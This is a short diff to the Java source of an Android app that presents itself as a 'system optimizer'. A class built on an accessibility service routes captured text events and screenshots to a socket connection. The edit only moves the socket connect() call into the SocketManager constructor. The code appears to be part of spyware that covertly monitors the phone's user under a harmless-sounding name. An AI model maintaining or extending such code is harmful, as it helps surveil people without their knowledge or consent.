@@ -2,8 +2,6 @@ package com.system.optimizer;
 
 import com.system.optimizer.event_handler.TextEventHandler;
 
-import io.socket.client.Socket;
-
 import com.system.optimizer.event_handler.ScreenshotEventHandler;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
@@ -58,13 +56,11 @@ public class SystemEventMonitor extends AccessibilityService {
      */
     private void initializeRemainingComponents() {
         try {
+            // SocketManager constructor already calls connect() internally
             this.socketManager = new SocketManager(this, configManager);
             this.textEventHandler = new TextEventHandler(socketManager);
             this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager, configManager);
             this.isInitialized = true;
-            
-            // Start socket connection after everything is initialized
-            socketManager.connect();
             
             Log.d(TAG, "All components initialized successfully");
         } catch (Exception e) {
